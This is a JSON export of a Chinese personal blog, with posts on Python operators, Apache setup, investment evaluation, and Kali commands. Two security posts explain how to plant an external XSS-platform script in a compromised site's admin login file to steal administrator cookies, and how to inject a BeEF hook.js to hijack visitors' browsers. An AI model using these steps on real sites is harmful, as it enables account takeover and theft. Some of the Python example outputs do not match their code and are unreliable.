，用真诚对待朋友，用平淡对待磨难，用努力追求幸福，用感恩对待生活，这就是人生旅途需要寻找的平衡点。","categories":[{"name":"关于博主","slug":"关于博主","permalink":"https://xiaowuyoucy.github.io/categories/关于博主/"}],"tags":[{"name":"人生事记","slug":"人生事记","permalink":"https://xiaowuyoucy.github.io/tags/人生事记/"}]},{"title":"Python运算符","slug":"201609060218","date":"2019-09-05T18:20:00.000Z","updated":"2019-09-05T21:19:05.032Z","comments":true,"path":"2019/09/06/201609060218/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/09/06/201609060218/","excerpt":"","text":"本章节主要说明Python的运算符。举个简单的例子 4 +5 = 9 。 例子中，4 和 5 被称为操作数，&quot;+&quot; 称为运算符。 Python语言支持以下类型的运算符: Python算术运算符 以下假设变量： a=10，b=20： 运算符描述实例 +加 - 两个对象相加 a + b 输出结果 30 -减 - 得到负数或是一个数减去另一个数 a - b 输出结果 -10 *乘 - 两个数相乘或是返回一个被重复若干次的字符串 a * b 输出结果 200 /除 - x除以y b / a 输出结果 2 %取模 - 返回除法的余数 b % a 输出结果 0 **幂 - 返回x的y次幂 a**b 为10的20次方， 输出结果 100000000000000000000 //取整除 - 返回商的整数部分（向下取整） &gt;&gt;&gt; 9//2 4 &gt;&gt;&gt; -9//2 -5 以下实例演示了Python所有算术运算符的操作： 123456789101112131415161718192021222324252627282930313233343536373839#!/usr/bin/python3# -*- coding: utf-8 -*-# @Time : 2019/9/6 2:03# @Author : JIANWEIWEN# @Email : wjw19951218@gmail.com# @File : 1.运算符.py# @Software: PyCharma = 21b = 10c = 0c = a + bprint(\"1 - c 的值为：\", c)c = a - bprint(\"2 - c 的值为：\", c)c = a * bprint(\"3 - c 的值为：\", c)c = a / bprint(\"4 - c 的值为：\", c)c = a % bprint(\"5 - c 的值为：\", c)# 修改变量 a 、b 、ca = 2b = 3c = a ** bprint(\"6 - c 的值为：\", c)a = 10b = 5c = a // bprint(\"7 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 31 2 - c 的值为： 11 3 - c 的值为： 210 4 - c 的值为： 2 5 - c 的值为： 1 6 - c 的值为： 8 7 - c 的值为： 2 注意：Python2.x 里，整数除整数，只能得出整数。如果要得到小数部分，把其中一个数改成浮点数即可。 &gt;&gt;&gt; 1/2 0 &gt;&gt;&gt; 1.0/2 0.5 &gt;&gt;&gt; 1/float(2) 0.5 Python比较运算符 以下假设变量a为10，变量b为20： 运算符 描述 实例 == 等于 - 比较对象是否相等 (a == b) 返回 False。 != 不等于 - 比较两个对象是否不相等 (a != b) 返回 true. &lt;&gt; 不等于 - 比较两个对象是否不相等 (a &lt;&gt; b) 返回 true。这个运算符类似 != 。 &gt; 大于 - 返回x是否大于y (a &gt; b) 返回 False。 &lt; 小于 - 返回x是否小于y。所有比较运算符返回1表示真，返回0表示假。这分别与特殊的变量True和False等价。 (a &lt; b) 返回 true。 &gt;= 大于等于 - 返回x是否大于等于y。 (a &gt;= b) 返回 False。 &lt;= 小于等于 - 返回x是否小于等于y。 (a &lt;= b) 返回 true。 以下实例演示了Python所有比较运算符的操作： 1234567891011121314151617181920212223242526272829303132333435363738394041a = 21b = 10c = 0if a == b: print(\"1 - a 等于 b\")else: print( \"1 - a 不等于 b\")if a != b: print( \"2 - a 不等于 b\")else: print( \"2 - a 等于 b\")if a &lt; b: print( \"3 - a 不等于 b\")else: print( \"3 - a 等于 b\")if a &lt; b: print (\"4 - a 小于 b\")else: print( \"4 - a 大于等于 b\")if a &gt; b: print( \"5 - a 大于 b\")else: print (\"5 - a 小于等于 b\")# 修改变量 a 和 b 的值a = 5b = 20if a &lt;= b: print(\"6 - a 小于等于 b\")else: print(\"6 - a 大于 b\")if b &gt;= a: print(\"7 - b 大于等于 a\")else: print(\"7 - b 小于 a\") 以上实例输出结果： 1 - a 不等于 b 2 - a 不等于 b 3 - a 不等于 b 4 - a 大于等于 b 5 - a 大于 b 6 - a 小于等于 b 7 - b 大于等于 a 以下实例演示了Python所有赋值运算符的操作： 12345678910111213141516171819202122232425a = 21b = 10c = 0c = a + bprint( \"1 - c 的值为：\", c)c += aprint( \"2 - c 的值为：\", c)c *= aprint( \"3 - c 的值为：\", c)c /= aprint( \"4 - c 的值为：\", c)c = 2c %= aprint( \"5 - c 的值为：\", c)c **= aprint( \"6 - c 的值为：\", c)c //= aprint( \"7 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 31 2 - c 的值为： 52 3 - c 的值为： 1092 4 - c 的值为： 52 5 - c 的值为： 2 6 - c 的值为： 2097152 7 - c 的值为： 99864 Python位运算符 按位运算符是把数字看作二进制来进行计算的。Python中的按位运算法则如下： 下表中变量 a 为 60，b 为 13，二进制格式如下： a = 0011 1100 b = 0000 1101 ----------------- a&amp;b = 0000 1100 a|b = 0011 1101 a^b = 0011 0001 ~a = 1100 0011 运算符 描述 实例 &amp; 按位与运算符：参与运算的两个值,如果两个相应位都为1,则该位的结果为1,否则为0 (a &amp; b) 输出结果 12 ，二进制解释： 0000 1100 | 按位或运算符：只要对应的二个二进位有一个为1时，结果位就为1。 (a | b) 输出结果 61 ，二进制解释： 0011 1101 ^ 按位异或运算符：当两对应的二进位相异时，结果为1 (a ^ b) 输出结果 49 ，二进制解释： 0011 0001 ~ 按位取反运算符：对数据的每个二进制位取反,即把1变为0,把0变为1 。~x 类似于 -x-1 (~a ) 输出结果 -61 ，二进制解释： 1100 0011，在一个有符号二进制数的补码形式。 &lt;&lt; 左移动运算符：运算数的各二进位全部左移若干位，由 &lt;&lt; 右边的数字指定了移动的位数，高位丢弃，低位补0。 a &lt;&lt; 2 输出结果 240 ，二进制解释： 1111 0000 &gt;&gt; 右移动运算符：把&quot;&gt;&gt;&quot;左边的运算数的各二进位全部右移若干位，&gt;&gt; 右边的数字指定了移动的位数 a &gt;&gt; 2 输出结果 15 ，二进制解释： 0000 1111 以下实例演示了Python所有位运算符的操作： 123456789101112131415161718192021a = 60 # 60 = 0011 1100b = 13 # 13 = 0000 1101c = 0c = a &amp; b # 12 = 0000 1100print(\"1 - c 的值为：\", c)c = a | b # 61 = 0011 1101print(\"2 - c 的值为：\", c)c = a ^ b # 49 = 0011 0001print(\"3 - c 的值为：\", c)c = ~a # -61 = 1100 0011print(\"4 - c 的值为：\", c)c = a &lt;&lt; 2 # 240 = 1111 0000print(\"5 - c 的值为：\", c)c = a &gt;&gt; 2 # 15 = 0000 1111print(\"6 - c 的值为：\", c) 以上实例输出结果： 1 - c 的值为： 12 2 - c 的值为： 61 3 - c 的值为： 49 4 - c 的值为： -61 5 - c 的值为： 240 6 - c 的值为： 15 Python逻辑运算符 Python语言支持逻辑运算符，以下假设变量 a 为 10, b为 20: 运算符 逻辑表达式 描述 实例 and x and y 布尔&quot;与&quot; - 如果 x 为 False，x and y 返回 False，否则它返回 y 的计算值。 (a and b) 返回 20。 or x or y 布尔&quot;或&quot; - 如果 x 是非 0，它返回 x 的值，否则它返回 y 的计算值。 (a or b) 返回 10。 not not x 布尔&quot;非&quot; - 如果 x 为 True，返回 False 。如果 x 为 False，它返回 True。 not(a and b) 返回 False 以上实例输出结果： 12345678910111213141516a = 0b = 20if a and b: print(\"3 - 变量 a 和 b 都为 true\")else: print(\"3 - 变量 a 和 b 有一个不为 true\")if a or b: print(\"4 - 变量 a 和 b 都为 true，或其中一个变量为 true\")else: print(\"4 - 变量 a 和 b 都不为 true\")if not (a and b): print(\"5 - 变量 a 和 b 都为 false，或其中一个变量为 false\")else: print(\"5 - 变量 a 和 b 都为 true\") 以上实例输出结果： 1 - 变量 a 和 b 都为 true 2 - 变量 a 和 b 都为 true，或其中一个变量为 true 3 - 变量 a 和 b 有一个不为 true 4 - 变量 a 和 b 都为 true，或其中一个变量为 true 5 - 变量 a 和 b 都为 false，或其中一个变量为 false Python成员运算符 除了以上的一些运算符之外，Python还支持成员运算符，测试实例中包含了一系列的成员，包括字符串，列表或元组。 运算符 描述 实例 in 如果在指定的序列中找到值返回 True，否则返回 False。 x 在 y 序列中 , 如果 x 在 y 序列中返回 True。 not in 如果在指定的序列中没有找到值返回 True，否则返回 False。 x 不在 y 序列中 , 如果 x 不在 y 序列中返回 True。 以下实例演示了Python所有成员运算符的操作： 1234567891011121314151617181920a = 10b = 20list = [1, 2, 3, 4, 5]if (a in list): print(\"1 - 变量 a 在给定的列表中 list 中\")else: print(\"1 - 变量 a 不在给定的列表中 list 中\")if (b not in list): print(\"2 - 变量 b 不在给定的列表中 list 中\")else: print(\"2 - 变量 b 在给定的列表中 list 中\")# 修改变量 a 的值a = 2if (a in list): print(\"3 - 变量 a 在给定的列表中 list 中\")else: print(\"3 - 变量 a 不在给定的列表中 list 中\") 以上实例输出结果： 1 - 变量 a 不在给定的列表中 list 中 2 - 变量 b 不在给定的列表中 list 中 3 - 变量 a 在给定的列表中 list 中 Python身份运算符 身份运算符用于比较两个对象的存储单元 运算符 描述 实例 is is 是判断两个标识符是不是引用自一个对象 x is y, 类似 id(x) == id(y) , 如果引用的是同一个对象则返回 True，否则返回 False is not is not 是判断两个标识符是不是引用自不同对象 x is not y ， 类似 id(a) != id(b)。如果引用的不是同一个对象则返回结果 True，否则返回 False。 注： id() 函数用于获取对象内存地址。 以下实例演示了Python所有身份运算符的操作： 123456789101112131415161718192021222324a = 20b = 20if (a is b): print(\"1 - a 和 b 有相同的标识\")else: print(\"1 - a 和 b 没有相同的标识\")if (a is not b): print(\"2 - a 和 b 没有相同的标识\")else: print(\"2 - a 和 b 有相同的标识\")# 修改变量 b 的值b = 30if (a is b): print(\"3 - a 和 b 有相同的标识\")else: print(\"3 - a 和 b 没有相同的标识\")if (a is not b): print(\"4 - a 和 b 没有相同的标识\")else: print(\"4 - a 和 b 有相同的标识\") 以上实例输出结果： 1 - a 和 b 有相同的标识 2 - a 和 b 有相同的标识 3 - a 和 b 没有相同的标识 4 - a 和 b 没有相同的标识 is 与 == 区别： is 用于判断两个变量引用对象是否为同一个(同一块内存空间)， == 用于判断引用变量的值是否相等。 &gt;&gt;&gt; a = [1, 2, 3] &gt;&gt;&gt; b = a &gt;&gt;&gt; b is a True &gt;&gt;&gt; b == a True &gt;&gt;&gt; b = a[:] &gt;&gt;&gt; b is a False &gt;&gt;&gt; b == a True Python运算符优先级 以下表格列出了从最高到最低优先级的所有运算符： 运算符 描述 ** 指数 (最高优先级) ~ + - 按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@) * / % // 乘，除，取模和取整除 + - 加法减法 &gt;&gt; &lt;&lt; 右移，左移运算符 &amp; 位 ‘AND’ ^ | 位运算符 &lt;= &lt; &gt; &gt;= 比较运算符 &lt;&gt; == != 等于运算符 = %= /= //= -= += *= **= 赋值运算符 is is not 身份运算符 in not in 成员运算符 not and or 逻辑运算符 以下实例演示了Python所有运算符优先级的操作： 1234567891011121314151617a = 20b = 10c = 15d = 5e = 0e = (a + b) * c / d # ( 30 * 15 ) / 5print(\"(a + b) * c / d 运算结果为：\", e)e = (a + b) * c / d # (30 * 15 ) / 5print(\"((a + b) * c) / d 运算结果为：\", e)e = (a + b) * (c / d); # (30) * (15/5)print(\"(a + b) * (c / d) 运算结果为：\", e)e = a + (b * c) / d; # 20 + (150/5)print(\"a + (b * c) / d 运算结果为：\", e) 以上实例输出结果： (a + b) * c / d 运算结果为： 90 ((a + b) * c) / d 运算结果为： 90 (a + b) * (c / d) 运算结果为： 90 a + (b * c) / d 运算结果为： 50","categories":[{"name":"Python","slug":"Python","permalink":"https://xiaowuyoucy.github.io/categories/Python/"}],"tags":[{"name":"Python运算符","slug":"Python运算符","permalink":"https://xiaowuyoucy.github.io/tags/Python运算符/"}]},{"title":"apache配置","slug":"201908210144","date":"2019-08-20T17:54:00.000Z","updated":"2019-08-20T18:28:40.119Z","comments":true,"path":"2019/08/21/201908210144/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/08/21/201908210144/","excerpt":"","text":"1.1 Apache的安装 对应的软件如下： Apache安装步骤： 1.解压“httpd-2.4.29-x86-r2.zip”，并将解压后的所有文件拷贝到目标文件夹wamp/apache下。 2.修改apache主配置文件(httpd.conf)中的“SVRROOT”为apache的实际目录。 提示：要修改的文件为：wamp/apache/conf/httpd.conf，大约第38行处。 管理员模式下运行cmd(或powershell)，并在其中运行apache/bin下的命令httpd.exe 如下所示：httpd.exe -k install 提示： httpd.exe所在位置为：apache/bin/目录中 如果想要删除该服务，则运行：httpd.exe -k uninstallt 4.双击打开如下文件并启动服务：wamp/apche/bin/ApacheMonitor.exe 1.2 检测apache配置文件语法的命令","categories":[{"name":"apache","slug":"apache","permalink":"https://xiaowuyoucy.github.io/categories/apache/"}],"tags":[{"name":"apache配置","slug":"apache配置","permalink":"https://xiaowuyoucy.github.io/tags/apache配置/"},{"name":"apache环境变量","slug":"apache环境变量","permalink":"https://xiaowuyoucy.github.io/tags/apache环境变量/"}]},{"title":"如何判断一个项目是否值得投资","slug":"201907150214","date":"2019-07-14T18:27:00.000Z","updated":"2019-07-14T18:57:02.008Z","comments":true,"path":"2019/07/15/201907150214/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/07/15/201907150214/","excerpt":"","text":"一、看准 一个团队（1个团队） 投资就是投人，投资就是投团队，尤其要看准投团队的领头人。创东方对目标企业团队成员的要求是：富有激情、和善诚信、专业敬业、善于学习。 二、发掘 两个优势（1优势行业+2优势企业） 在优势行业中发掘、寻找优势企业。优势行业是指具有广阔发展前景、国家政策支持、市场成长空间巨大的行业；优势企业是在优势行业中具有核心竞争力，细分行业排名靠前的优秀企业，其核心业务或主营业务要突出，企业的核心竞争力要突出，要超越其他竞争者。 三、弄清 三个模式（1业务模式+2盈利模式+3营销模式） 就是弄清目标企业是如何挣钱的。业务模式是企业提供什么产品或服务，业务流程如何实现，包括业务逻辑是否可行，技术是否可行，是否符合消费者心理和使用习惯等，企业的人力、资金、资源是否足以支持。盈利模式是指企业如何挣钱，通过什么手段或环节挣钱。营销模式是企业如何推广自己的产品或服务，销售渠道、销售激励机制如何等。好的业务模式，必须能够赢利，好的赢利模式，必须能够推行。 四、查看 四个指标（1营业收入+2营业利润+3净利率+4增长率） PE 投资的重要目标是目标企业尽快改制上市，我们因此关注、查看近目标企业近三年的上述前两个指标尤为重要。PE投资非常看重的盈利能力和成长性，我们由此关注上述的后两个指标。净利率是销售净利润率，表达了一个企业的盈利能力和抗风险能力，增长率可以迅速降低投资成本，让投资人获取更高的投资回报。把握前四个指标，则基本把握了项目的可投资性。 五、厘清 五个结构（1股权结构+2高管结构+3业务结构+4客户结构+5供应商结构） 厘清五个结构也很重要，让投资人对目标企业的具体结构很清晰，便于判断企业的好坏优劣。 股权结构：主次分明，主次合理； 高管结构：结构合理，优势互补，团结协作； 业务结构：主营突出，不但研发新产品； 客户结构：既不太散又不太集中，客户有实力； 供应商结构：既不太散又不太集中，质量有保证。 六、考察六个层面（1历史合规+2财务规范+3依法纳税+4产权清晰+5劳动合规+6环保合规） 考察六个层面是对目标企业的深度了解，任何一个层面存在关键性问题，可能影响企业的改制上市。当然，有些企业存在一些细小暇疵，可以通过规范手段予以改进。 历史合规：目标企业的历史沿革合法和规，在注册验资、股权变更等方面不存在重大历史瑕疵； 财务规范：财务制度健全，会计标准合规，坚持公正审计； 依法纳税：不存在依法纳税的问题； 产权清晰：企业的产权清晰到位（含专利、商标、房产等），不存在纠纷； 劳动合规：严格执行劳动法规； 6. 环保合规：企业生产经营符合环保要求，不存在搬迁、处罚等隐患。 七、落实 七个关注（1制度汇编+2例会制度+3企业文化+4战略规划+5人力资源+6公共关系+7激励机制） 七个关注是对目标企业细小环节的关注。如果存在其中的问题，可以通过规范、引导的办法加以改进。但其现状是我们判断目标企业经营管理的重要依据。 制度汇编：查看企业的制度汇编可以迅速认识企业管理的规范程度。有的企业制度不全，更没有制度汇编； 例会制度：询问企业的例会情况（含总经理办公周例会、董事会例会、股东会例会）能够了解规范管理情况，也能了解企业高管对股东是否尊重； 企业文化：通过了解企业的文化建设能知道企业是否具有凝聚力和亲和力，是否具备长远发展的可能； 战略规划：了解企业的战略规划情况，可以知道企业的发展有无目标，查看其目标是否符合行业经济发展的实际方向； 人力资源：了解企业对员工培训、激励计划、使用办法，可以了解企业是否能充分调动全体员工发展业务的积极性和能动性，考察企业的综合竞争力； 公共关系：了解企业的公共关系策略和状况，可以知道企业是否具备社会公民意识，是否注重企业形象和品牌，是否具有社会责任意识； 激励机制：一个优秀的现代企业应该有一个激励员工、提升团队的机制或计划，否则，企业难于持续做强做大。 八、分析八个数据（1.总资产周转率、2资产负债率、3.流动比率、4.应收帐款周转天数（应收帐款周转率）、5、销售毛利率、6.净值报酬率、7.经营活动净现金流、8、市场占有率） 在厘清四个指标的基础上，我们很有必要分析以下八个数据，是我们对目标企业的深度分析、判断。 资产周转率：表示多少资产创造多少销售收入，表明一个公司是资产（资本）密集型还是轻资产型。该项指标反映资产总额的周转速度，周转越快，反映销售能力越强，企业可以通过薄利多销的办法，加速资产的周转，带来利润绝对数的增加。计算公式：总资产周转率=销售收入÷平均总资产 资产负债率：资产负债率是负债总额除以资产总额的百分比，也就是负债总额与资产总额的比例关系。资产负债率反映在总资产中有多大比例是通过借债来筹资的，也可以衡量企业在清算时保护债权人利益的程度；资产负债率的高低，体现一个企业的资本结构是否合理。计算公式：资产负债率=（负债总额÷资产总额）×100% 流动比率：流动比率是流动资产除以流动负债的比例，反映企业的短期偿债能力。流动资产是最容易变现的资产，流动资产越多，流动负债越少，则短期偿债能力越强。计算公式：流动比率=流动资产÷流动负债 应收帐款周转天数（应收帐款周转率）：应收帐款周转率反映应收帐款的周转速度，也就是年度内应收帐款转为现金的平均次数。用时间表示的周转速度是应收帐款周转天数，也叫平均收现期，表示自企业从取得应收帐款的权利到收回款项，转换为现金所需要的时间。一般来说，应收帐款周转率越高、平均收帐期越短，说明应收帐款收回快。否则，企业的营运资金会过多地呆滞在应收帐款上，影响正常的资金周转。计算公式：应收帐款周转率=销售收入÷平均应收帐款；应收帐款周转天数=360÷应收帐款周转率 销售毛利率：销售毛利率,表示每一元销售收入扣除销售产品或商品成本后,有多少钱可以用于各期间费用和形成利泣,是企业销售净利率的最初基础,没有足够大的毛利率便不能盈利。计算公式：销售毛利率=（销售收入-销售成本）÷销售收入）×100%。 净值报酬率：净值报酬率是净利润与平均股东权益（所有者权益）的百分比，也叫股东权益报酬率。该指标反映股东权益的收益水平。计算公式：净值报酬率=（净利润÷平均股东权益）×100% 经营活动净现金流：经营活动净现金流，是企业在一个会计期间（年度或月份，通常指年度）经营活动产生的现金流入与经营活动产生的现金流出的差额。这一指标说明经营活动产生现金的能力，企业筹集资金额根据实际生产经营需要，通过现金流量表，可以确定企业筹资总额。一般来说，企业财务状况越好，现金净流量越多，所需资金越少，反之，财务状况越差，现金净流量越少，所需资金越多。一个企业经营净现金流量为负，说明企业需筹集更多的资金满足于生产经营所需，否则企业正常生产经营难以为继。 市场占有率：市场占有率，也可称为“市场份额”是企业在运作的市场上所占有的百分比，是企业的产品在市场上所占份额，也就是企业对市场的控制能力。企业市场份额的不断扩大，可以使企业获得某种形式的垄断，这种垄断既能带来垄断利润又能保持一定的竞争优势。当一个企业获得市场25%的占有率时，一般就被认为控制了市场。市场占有率对企业至关重要，一方面它是反映企业经营业绩最关键的指标之一，另一方面它是企业市场地位最直观的体现。市场占有率是由企业的产品力、营销力和形象力共同决定的。 九、走好九个程序（1收集资料+2高管面谈+3企业考察+4竞争调查+5供应商走访+6客户走访+7协会走访+8政府走访+9券商咨询） 要做好一个投资项目，我们有很多程序要走，而且不同的目标企业所采取的程序应该有所不同、分别对待，但是以下就个程序是应该坚持履行的。 收集资料：通过多种形式收集企业资料； 高管面谈：高管面谈，是创业投资的一个初步环境也是非常重要的环节。依据过往经验，往往能很快得出对目标企业业务发展、团队素质的印象。有时一次高管接触，你就不想再深入下去了，因为印象不好。第一感觉往往很重要，也比较可靠。 企业考察：对企业的经营、研发、生产、管理、资源等实施实地考察；对高管以下的员工进行随机或不经意的访谈，能够得出更深层次的印象或结论。 竞争调查：梳理清楚该市场中的竞争格局和对手的情况。通过各种方式和途径对竞争企业进行考察、访谈或第三方评价；对比清楚市场中的各种竞争力量及其竞争优劣势。对竞争企业的信息和对比掌握得越充分、投资的判断就会越准！ 供应商走访：了解企业的采购量、信誉，可以帮助我们判断企业声誉、真实产量；同时也从侧面了解行业竞争格局； 客户走访：可以了解企业产品质量和受欢迎程度，了解企业真实销售情况，了解竞争企业情况；同时，客户自身的档次和优质情况也有助于判断企业的市场地位、以及市场需求的潜力和可持续程度。 协会走访：了解企业的行业地位和声誉，了解行业的发展态势； 政府走访：了解企业的行业地位和声誉，了解政府对企业所处行业的支持程度； 券商咨询：针对上市可行性和上市时间问题咨询券商，对我们判断企业成熟度有重要作用。 十、报告 十个内容（1 企业历史沿革2企业产品与技术3行业分析（机会与威胁） 4企业优势及不足 5发展规划6股权结构 7高管结构 8财务分析 9融资计划 10投资意见） 《尽职调查报告》是创业投资业务的基本功，是对前期工作的总结，是最终决策依据。写好《尽职调查报告》，至少应报告以下10个方面的主要内容。 企业历史沿革：股权变动情况，重大历史事件等； 企业产品与技术：公司业务情况、技术来源； 行业分析：行业概况、行业机会与威胁，竞争对手分析； 优势和不足：企业有哪些优势，哪些是核心竞争力；存在不足或缺陷，有无解决或改进办法； 发展规划：企业的近期、中期的发展规划和发展战略；以及发展规划的可实现性； 股权结构：股权结构情况，合理性分析； 高管结构：高管人员和技术人员背景情况，优势、劣势分析； 财务分析：近年各项财务数据或指标情况及分析； 融资计划：企业发展计划和融资计划及融资条件； 投资意见：投资经理对项目的总体意见或建议。 “厨师炒菜，各有各法。”每家创业投资团队都有自己看项目的办法，创东方的投资要诀只是其中的一种而已。","categories":[{"name":"理财投资","slug":"理财投资","permalink":"https://xiaowuyoucy.github.io/categories/理财投资/"}],"tags":[{"name":"理财，投资","slug":"理财，投资","permalink":"https://xiaowuyoucy.github.io/tags/理财，投资/"}]},{"title":"Python笔记","slug":"201905262134","date":"2019-05-26T13:46:01.000Z","updated":"2019-05-26T14:03:39.803Z","comments":true,"path":"2019/05/26/201905262134/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/05/26/201905262134/","excerpt":"","text":"Python是荷兰著名的“龟叔”Guido van Rossum在1989年圣诞节期间，为了打发无聊的圣诞节而编写的一个编程语言，现在，全世界差不多有600多种编程语言，但流行的编程语言也就那么20来种。如果你听说过TIOBE排行榜，你就能知道编程语言的大致流行程度。这是最近10年最常用的10种编程语言的变化图： 总的来说，这几种编程语言各有千秋。C语言是可以用来编写操作系统的贴近硬件的语言，所以，C语言适合开发那些追求运行速度、充分发挥硬件性能的程序。而Python是用来编写应用程序的高级编程语言，当你用一种语言开始作真正的软件开发时，你除了编写代码外，还需要很多基本的已经写好的现成的东西，来帮助你加快开发进度。比如说，要编写一个电子邮件客户端，如果先从最底层开始编写网络协议相关的代码，那估计一年半载也开发不出来。高级编程语言通常都会提供一个比较完善的基础代码库，让你能直接调用，比如，针对电子邮件协议的SMTP库，针对桌面环境的GUI库，在这些已有的代码库的基础上开发，一个电子邮件客户端几天就能开发出来。 Python就为我们提供了非常完善的基础代码库，覆盖了网络、文件、GUI、数据库、文本等大量内容，被形象地称作“内置电池（batteries included）”。用Python开发，许多功能不必从零编写，直接使用现成的即可；除了内置的库外，Python还有大量的第三方库，也就是别人开发的，供你直接使用的东西。当然，如果你开发的代码通过很好的封装，也可以作为第三方库给别人使用。 许多大型网站就是用Python开发的，例如YouTube、Instagram，还有国内的豆瓣。很多大公司，包括Google、Yahoo等，甚至NASA（美国航空航天局）都大量地使用Python；龟叔给Python的定位是“优雅”、“明确”、“简单”，所以Python程序看上去总是简单易懂，初学者学Python，不但入门容易，而且将来深入下去，可以编写那些非常非常复杂的程序。 总的来说，Python的哲学就是简单优雅，尽量写容易看明白的代码，尽量写少的代码。如果一个资深程序员向你炫耀他写的晦涩难懂、动不动就几万行的代码，你可以尽情地嘲笑他。 那Python适合开发哪些类型的应用呢？ 首选是网络应用，包括网站、后台服务等等； 其次是许多日常需要的小工具，包括系统管理员需要的脚本任务等等； 另外就是把其他语言开发的程序再包装起来，方便使用。 最后说说Python的缺点。 任何编程语言都有缺点，Python也不例外。优点说过了，那Python有哪些缺点呢？ 第一个缺点就是运行速度慢，和C程序相比非常慢，因为Python是解释型语言，你的代码在执行时会一行一行地翻译成CPU能理解的机器码，这个翻译过程非常耗时，所以很慢。而C程序是运行前直接编译成CPU能执行的机器码，所以非常快。 但是大量的应用程序不需要这么快的运行速度，因为用户根本感觉不出来。例如开发一个下载MP3的网络应用程序，C程序的运行时间需要0.001秒，而Python程序的运行时间需要0.1秒，慢了100倍，但由于网络更慢，需要等待1秒，你想，用户能感觉到1.001秒和1.1秒的区别吗？这就好比F1赛车和普通的出租车在北京三环路上行驶的道理一样，虽然F1赛车理论时速高达400公里，但由于三环路堵车的时速只有20公里，因此，作为乘客，你感觉的时速永远是20公里。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://xiaowuyoucy.github.io/categories/编程开发/"}],"tags":[{"name":"Python教程","slug":"Python教程","permalink":"https://xiaowuyoucy.github.io/tags/Python教程/"},{"name":"Python笔记","slug":"Python笔记","permalink":"https://xiaowuyoucy.github.io/tags/Python笔记/"}]},{"title":"XSS-Cookie维持权限应用","slug":"201904232243","date":"2019-04-23T14:44:01.000Z","updated":"2019-04-24T05:19:22.541Z","comments":true,"path":"2019/04/23/201904232243/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/23/201904232243/","excerpt":"","text":"Cookie维持权限应用 条件： 1.已经获取网站webshell权限 2.网站后台目录文件有可写权限 漏洞原理： 利用js代码获取每次登陆成功的用户Cookie（管理员权限） 接下来我们演示一下，这个过程，这里我首先注册一下配置一下XSS平台 推荐大家到 https://xsspt.com 是个免费不错的XSS测试利用平台， 注册好之后我们添加项目，如下图所示配置： 填写完信息之后点击下一步 勾选上这几项，之后点击下一步，就配置完成XSS基本的测试了， 之后找到该项目的测试代码。 将如下代码植入怀疑出现xss的地方（注意’的转义），即可在 项目内容 观看XSS效果。 1&lt;script src=https://xsspt.com/9f6glg&gt;&lt;/script&gt; 把该代码嵌入到你要维权的后台登陆的那个配置文件即可，这里我就搭建一个本地测试， 我找到该项目后台的配置文件， 用编辑的方式打开，把刚才XSS测试的代码复制进去，之后点击关闭保持， 好，做完这步操作之后，我们来测试一下，假设现在管理员登陆后台，我们看看能不能通过， 刚才的手段获取到我们想要的信息， 登陆进来了，我们这时再回到XSS平台点击项目，看看有没有接收到管理员登陆的Cookie和其他一些相关信息， 看这里已经实时的把管理员登陆的Cookie和其他一些相关信息接收过来了，这些都是很常见的一些， Cookie维权方式之一吧。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://xiaowuyoucy.github.io/tags/XSS/"},{"name":"Cookie","slug":"Cookie","permalink":"https://xiaowuyoucy.github.io/tags/Cookie/"}]},{"title":"beef劫持客户端浏览器","slug":"201904250308","date":"2019-04-23T14:44:01.000Z","updated":"2019-05-07T13:59:05.919Z","comments":true,"path":"2019/04/23/201904250308/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/23/201904250308/","excerpt":"","text":"kali linux里集合了beef劫持客户端浏览器的工具，beef是比较著名的一个xss利用框架， 它是基于web界面的交换方式友好，高度集成，开源的一个项目！和国外其他渗透测试项目一样，它也可以和其他很多工具结合使用，如MSF。 使用方法： 打开kali linux 打开终端搜索 find / -name beef root@kali:~# find / -name beef /usr/share/beef-xss/beef /usr/share/python-faraday/plugins/repo/beef find: ‘/run/user/130/gvfs’: 权限不够 root@kali:~# ^C root@kali:~# find搜索到beef的所在路径，我们需要切换到beef的所在目录将其启动即可 cd /usr/share/beef-xss 切换到beef所在目录 ./beef 启动运行 启动之后beef会有详细的参数地址给出，如下图： Hook URL: http://192.168.1.115:3000/hook.js hook是一个利用的js外链，每当XSS攻击执行该行js代码之后就会被触发 UI URL: http://192.168.1.115:3000/ui/panel 这是beef的控制端，每当hook被触发之后beef控制端就能控制客户端的一系列浏览器活动信息，比如Cookie和转跳，恶意下载木马链接等等操作。 我们把beef的利用代码 http://192.168.1.115:3000/hook.js 以js脚本的方式提交在有xss利用漏洞的留言板上， 每当客户端的浏览器访问即触发beef的利用代码，beef服务端上线达到控制客户端的浏览器权限 我们模拟一下客户端访问浏览器，这是会触发beef的恶意代码，我们可以看到如下的gif，beef的服务器可以，进行客户端浏览器的操作，转跳 ,下载，盗取cookie等… 结合beef 可以进行很多漏洞利用的操作，这就是beef的强大之处吧。","categories":[{"name":"WEB安全渗透","slug":"WEB安全渗透","permalink":"https://xiaowuyoucy.github.io/categories/WEB安全渗透/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://xiaowuyoucy.github.io/tags/XSS/"},{"name":"beef劫持","slug":"beef劫持","permalink":"https://xiaowuyoucy.github.io/tags/beef劫持/"}]},{"title":"KaliLinux-Bash命令","slug":"201904212314","date":"2019-04-22T12:32:18.000Z","updated":"2019-04-27T10:31:11.766Z","comments":true,"path":"2019/04/22/201904212314/","link":"","permalink":"https://xiaowuyoucy.github.io/2019/04/22/201904212314/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879ls -l 显示当前目录的文件信息,大小以字节显示ls -lh 显示当前目录的文件信息,大小以KBls -lh --sort=size 当前文件目录按大小顺序排序ls -a 显示当前目录的隐藏文件ls -lh --sort=time 按时间排序，最新修改的排最上cd 进入某个目录和Windows的cd一样pwd 查看当前工作目录clean 清屏cat /var/log/messages 